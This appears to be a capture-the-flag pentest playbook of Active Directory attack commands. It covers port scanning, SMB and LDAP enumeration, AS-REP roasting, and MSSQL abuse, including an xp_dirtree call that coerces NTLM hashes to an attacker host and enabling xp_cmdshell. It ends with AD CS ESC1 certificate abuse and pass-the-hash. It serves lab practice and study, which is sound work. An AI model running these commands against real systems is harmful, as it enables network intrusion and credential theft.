## Recon baseline
- Ping or TCP check: `ping <IP>` (or `nc -vz <IP> 80` if ICMP blocked).
- Full TCP sweep: `nmap -p- --min-rate=3000 -Pn -oN nmap/OpenPorts.txt <IP>`
	- `-p-` all TCP; `--min-rate` speed; `-Pn` skip host discovery; `-oN` save.
- Scripted follow-up: `ports=$(awk '/^[0-9]+\/tcp/ {print $1}' nmap/OpenPorts.txt|cut -d/ -f1|paste -sd,)`
	- `awk` pull port column; `cut` remove `/tcp`; `paste -sd,` join for `-p`.
	- `nmap -p$ports -sSCV --min-rate=2000 -Pn -oN nmap/ServicesVersions.txt <IP>`
		- `-sS` SYN; `-sC` default scripts; `-sV` version; `--min-rate` speed; `-oN` save.
- If DNS present: `dig @<IP> any <domain>` / attempt zone transfer.

## Web (80/443)
- Dir enum: `ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://<IP>/FUZZ -e .php,.txt -t 20`
	- `-w` wordlist; `-u` target with FUZZ; `-e` extensions; `-t` threads.
- Alt: `gobuster dir -u http://<host> -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt -t 20`
	- `dir` mode; `-u` URL; `-w` wordlist; `-t` threads.

## Active Directory quickstart
- SMB null: `smbclient -N -L //<host>`
	- `-N` no auth; `-L` list shares.
- LDAP anon: `ldapsearch -x -H ldap://<host> -b "DC=...,DC=..."` (look for failures/success)
	- `-x` simple bind; `-H` LDAP URI; `-b` base DN.
- Kerberos user enum / AS-REP roast if you have names: `GetNPUsers.py <realm>/ -no-pass -usersfile users.txt -dc-ip <IP> -format hashcat`
	- `-no-pass` anon; `-usersfile` list; `-dc-ip` DC IP; `-format hashcat` for cracking.
- MSSQL check: `mssqlclient.py <user>:<pass>@<host>` (use SQL auth if given/leaked)
	- Use `<domain>/<user>` if AD auth; omit domain for SQL auth.
- WinRM check (once creds in hand): `nxc winrm <IP> -u <user> -p <pass>`
	- `-H` for hash; `-k` for Kerberos.

## MSSQL playbook (from Escape)
- With SQL/AD auth: `impacket-mssqlclient <domain>/<user>:<pass>@<IP>`
	- `<domain>/` for AD auth; drop domain for SQL auth; supports `-windows-auth` alt.
- Enumerate DBs: `SELECT name FROM master.sys.databases;`
- Coerce hash to Responder: `xp_dirtree '\\\\<attacker_ip>\\share'`
	- Forces server to SMB to you → Responder captures NetNTLMv2.
- Crack NetNTLMv2 → new creds (e.g., `sql_svc`).
- Check SQL error logs for leaked creds: `xp_readerrorlog 0,1,N'Login failed';`
	- `0` log file index; `1` log type; final string is search term.
- If needed, enable xp_cmdshell: `EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;`
	- First enables advanced options, then enables xp_cmdshell; `RECONFIGURE` applies.

## Credential discovery pivot
- Logs/hints: read `SQL Server` logs, `description` fields in LDAP, files in SMB shares.
- Use captured hashes:
	- NetNTLMv2: crack with hashcat mode 5600.
	- NT hash: PTH with `evil-winrm` / `nxc smb --hashes` / `psexec`.

## AD CS (ESC1) abuse (from Escape)
- Enumerate: `certipy find -dc-ip <IP> -u <user> -p <pass> -enabled -vulnerable`
	- `-enabled` only active templates; `-vulnerable` highlight ESC paths; `-dc-ip` DC/CA locator.
- Request vulnerable template: `certipy req -dc-ip <IP> -u <user> -p '<pass>' -ca <CA> -template <Template> -upn administrator@<domain> -dns <dc> -outfile administrator`
	- `-template` vulnerable template; `-upn` spoofed principal; `-outfile` base for .pfx/.key.
- Convert to auth: `certipy auth -pfx administrator.pfx -dc-ip <IP>` → saves `.ccache`, prints NT hash.
	- `auth` turns cert into TGT; outputs NT hash + ccache.
- Use Kerberos ticket: `KRB5CCNAME=administrator.ccache evil-winrm -i <IP> -r <realm> -u administrator -k`
	- `-k` Kerberos auth; `KRB5CCNAME` path to ticket; `-r` realm.

## Post-foothold triage
- Who/where: `whoami /groups`, `hostname`, `ipconfig /all`
- Privileges: `whoami /priv`
- WinRM/SMB reachability to others if lateral is needed.
- Loot common dirs: `C:\Users\<user>\Desktop`, `C:\Users\Public`, scheduled tasks/services.

## Evidence capture
- Save outputs to `logs/` (e.g., `| tee logs/<name>.txt`).
- Save loot to `loot/` (hashes, dumps, pfx/ccache, dumps).
- Note flag paths and commands used.
